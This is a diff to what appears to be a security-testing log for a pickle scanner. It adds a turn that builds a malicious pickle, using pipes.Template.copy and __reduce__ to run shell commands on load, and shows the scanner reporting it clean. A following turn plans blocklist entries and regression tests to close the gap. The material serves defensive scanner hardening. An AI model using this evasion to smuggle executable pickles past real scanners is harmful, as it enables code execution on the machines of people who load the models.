@@ -102,3 +102,61 @@ Blocking plan:
 
 Performance note: the block is a single additional binary-search entry. It does
 not add any module-prefix expansion or extra payload walking.
+
+## Turn 5 - `pipes.Template.copy` pipeline execution gap
+
+Goal: produce another RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag.
+
+Payload shape:
+
+```python
+import pipes
+
+
+class PipesTemplateCopyRce:
+    def __reduce__(self):
+        template = pipes.Template()
+        template.append("touch /tmp/ma_pipes_marker; cat $IN > $OUT", "ff")
+        return (pipes.Template.copy, (template, "/dev/null", "/tmp/ma_pipes_out"))
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `findings=[]`
+- Unpickle result: creates `/tmp/ma_pipes_marker` and
+  `/tmp/ma_pipes_out`
+- RCE mechanism: `pipes.Template.copy()` calls
+  `os.system(self.makepipeline(infile, outfile))`; the pickled `Template`
+  instance carries attacker-controlled `steps`, so the final pipeline is
+  attacker-controlled shell syntax.
+
+Why the scanner missed it:
+
+- `pipes` is absent from both `DANGEROUS_WILDCARD_MODULES` and
+  `DANGEROUS_GLOBALS`.
+- The callable is reached as the dotted global `pipes.Template.copy`; protocol
+  4 dotted-name resolution avoids any separately flagged helper such as
+  `builtins.getattr`.
+- The command string can avoid existing suspicious string literals such as
+  `os.system`, `subprocess`, or `eval`.
+
+Performance note: this is a policy coverage gap. The exact scanner key for the
+proof is `("pipes", "Template.copy")`, because protocol 4 dotted globals keep
+the module as `pipes` and the attribute path as `Template.copy`.
+
+## Turn 6 - Block `pipes.Template` pipeline methods
+
+Blocking plan:
+
+- Add explicit dangerous-global entries for `pipes.Template.copy`,
+  `pipes.Template.open`, `pipes.Template.open_r`, and `pipes.Template.open_w`.
+  These methods all execute pipeline commands via `os.system()` or `os.popen()`
+  when a pickled `Template` carries attacker-controlled `steps`.
+- Add portable policy coverage for all four raw global reductions so detection
+  does not depend on the deprecated `pipes` module being available.
+- Add an optional CPython oracle regression for the proven
+  `pipes.Template.copy` marker-file payload when `pipes` is available.
+
+Performance note: the block adds four sorted binary-search entries and no new
+payload scanning or module-prefix expansion.
